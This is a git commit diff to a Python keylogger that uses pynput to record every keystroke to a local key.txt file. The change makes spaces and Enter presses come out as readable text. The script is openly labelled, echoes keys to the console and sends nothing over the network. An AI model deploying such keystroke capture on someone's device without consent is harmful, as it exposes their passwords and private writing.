efb0af82ec989d1b280d39e688ac268c922dfb5d
Suyash Gupta <suyashgupta0001@gmail.com>
2022-05-06 17:33:39 +0530

    keylogger updated to reflect Enter, Space in key.txt PLUS it appends to key.txt

--- keylogger.py
+++ keylogger.py
@@ -5,14 +5,20 @@
 from pynput import keyboard
 
 def log_keys():
-    f = open("key.txt", "a+")
+    f = open("key.txt", "a")
 
     def on_press(key):
         if key == keyboard.Key.esc:
             return False  # stop listener
         else:
             print(str(key))
-            f.write("\n" + str(key))
+            if str(key) == "Key.space":
+                write_this = ' '
+            elif str(key) == "Key.enter":
+                write_this = '\n'
+            else:
+                write_this = str(key)
+            f.write(write_this)
             
     listener = keyboard.Listener(on_press=on_press)
     listener.start()  # start to listen on a separate thread
